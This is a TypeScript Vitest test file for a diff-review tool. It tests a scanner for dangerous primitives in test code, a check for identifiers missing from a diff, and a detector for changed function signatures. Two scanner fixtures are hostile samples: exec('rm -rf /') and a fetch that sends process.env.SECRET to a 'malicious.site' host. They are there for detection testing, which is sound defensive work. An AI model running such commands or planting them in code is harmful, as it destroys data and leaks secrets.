import { describe, it, expect } from 'vitest';
import { scanTestSafety } from '../src/core/safety-scan';
import { extractDiffIdentifiers, checkTestIdentifiers } from '../src/core/identifiers';
import { detectSignatureBlindSpots } from '../src/core/blind-spots';
import type { DiffLine, ParsedDiff } from '../src/core/types';

describe('scanTestSafety', () => {
  it('detects dangerous filesystem and process primitives', () => {
    const dangerousCode = `
      it('executes command', () => {
        const { exec } = require('child_process');
        exec('rm -rf /');
      });
    `;
    const result = scanTestSafety(dangerousCode);
    expect(result.hasWarning).toBe(true);
    expect(result.detectedPrimitives).toContain('child_process');
    expect(result.detectedPrimitives).toContain('exec');
  });

  it('detects network and eval primitives', () => {
    const dangerousCode = `
      it('calls external webhook', async () => {
        await fetch('https://malicious.site/leak?token=' + process.env.SECRET);
      });
    `;
    const result = scanTestSafety(dangerousCode);
    expect(result.hasWarning).toBe(true);
    expect(result.detectedPrimitives).toContain('fetch');
    expect(result.detectedPrimitives).toContain('process.env');
  });

  it('passes safe test code without warnings', () => {
    const safeCode = `
      it('adds two numbers', () => {
        expect(add(1, 2)).toBe(3);
      });
    `;
    const result = scanTestSafety(safeCode);
    expect(result.hasWarning).toBe(false);
    expect(result.detectedPrimitives).toHaveLength(0);
  });
});

describe('checkTestIdentifiers', () => {
  const dummyLines: DiffLine[] = [
    { id: 'L0001', file: 'src/calc.ts', kind: 'added', oldLine: null, newLine: 1, text: 'export function calculateDiscount(cart: Cart) { return cart.total; }' },
  ];

  it('marks diff identifiers as visible and unknown identifiers as not visible', () => {
    const diffTokens = extractDiffIdentifiers(dummyLines);
    expect(diffTokens.has('calculateDiscount')).toBe(true);
    expect(diffTokens.has('Cart')).toBe(true);

    const testCode = `
      it('verifies discount', () => {
        const cart = { total: 100 };
        const result = calculateDiscount(cart);
        expect(result).toBe(100);
        const secretHelper = mysteryModule.doSomething();
      });
    `;

    const check = checkTestIdentifiers(testCode, diffTokens);

    // calculateDiscount is visible
    const calc = check.find((c) => c.name === 'calculateDiscount');
    expect(calc?.visible).toBe(true);

    // secretHelper and mysteryModule are not in diff
    const secret = check.find((c) => c.name === 'secretHelper');
    expect(secret?.visible).toBe(false);

    const mystery = check.find((c) => c.name === 'mysteryModule');
    expect(mystery?.visible).toBe(false);

    // Standard items (expect, toBe, const, it) are filtered by allowlist
    expect(check.some((c) => c.name === 'expect')).toBe(false);
    expect(check.some((c) => c.name === 'toBe')).toBe(false);
  });
});

describe('detectSignatureBlindSpots', () => {
  it('detects function signature change when callers are not in the diff', () => {
    const parsedDiff: ParsedDiff = {
      files: [
        {
          path: 'src/api.ts',
          isTest: false,
          isJsTs: true,
          isGenerated: false,
          lines: [
            { id: 'L0001', file: 'src/api.ts', kind: 'removed', oldLine: 10, newLine: null, text: 'export function fetchData(url: string) {' },
            { id: 'L0002', file: 'src/api.ts', kind: 'added', oldLine: null, newLine: 10, text: 'export function fetchData(url: string, timeout: number, options: Options) {' },
          ],
        },
      ],
      lines: [
        { id: 'L0001', file: 'src/api.ts', kind: 'removed', oldLine: 10, newLine: null, text: 'export function fetchData(url: string) {' },
        { id: 'L0002', file: 'src/api.ts', kind: 'added', oldLine: null, newLine: 10, text: 'export function fetchData(url: string, timeout: number, options: Options) {' },
      ],
      totalChangedLines: 2,
    };

    const blindSpots = detectSignatureBlindSpots(parsedDiff);
    expect(blindSpots).toHaveLength(1);
    expect(blindSpots[0]).toContain("Function 'fetchData' signature changed, but callers are not visible in this diff");
  });

  it('does not flag if callers exist in the diff', () => {
    const parsedDiff: ParsedDiff = {
      files: [
        {
          path: 'src/api.ts',
          isTest: false,
          isJsTs: true,
          isGenerated: false,
          lines: [
            { id: 'L0001', file: 'src/api.ts', kind: 'removed', oldLine: 10, newLine: null, text: 'export function fetchData(url: string) {' },
            { id: 'L0002', file: 'src/api.ts', kind: 'added', oldLine: null, newLine: 10, text: 'export function fetchData(url: string, timeout: number) {' },
            { id: 'L0003', file: 'src/api.ts', kind: 'added', oldLine: null, newLine: 25, text: 'const data = fetchData("https://example.com", 5000);' },
          ],
        },
      ],
      lines: [
        { id: 'L0001', file: 'src/api.ts', kind: 'removed', oldLine: 10, newLine: null, text: 'export function fetchData(url: string) {' },
        { id: 'L0002', file: 'src/api.ts', kind: 'added', oldLine: null, newLine: 10, text: 'export function fetchData(url: string, timeout: number) {' },
        { id: 'L0003', file: 'src/api.ts', kind: 'added', oldLine: null, newLine: 25, text: 'const data = fetchData("https://example.com", 5000);' },
      ],
      totalChangedLines: 3,
    };

    const blindSpots = detectSignatureBlindSpots(parsedDiff);
    expect(blindSpots).toHaveLength(0);
  });
});
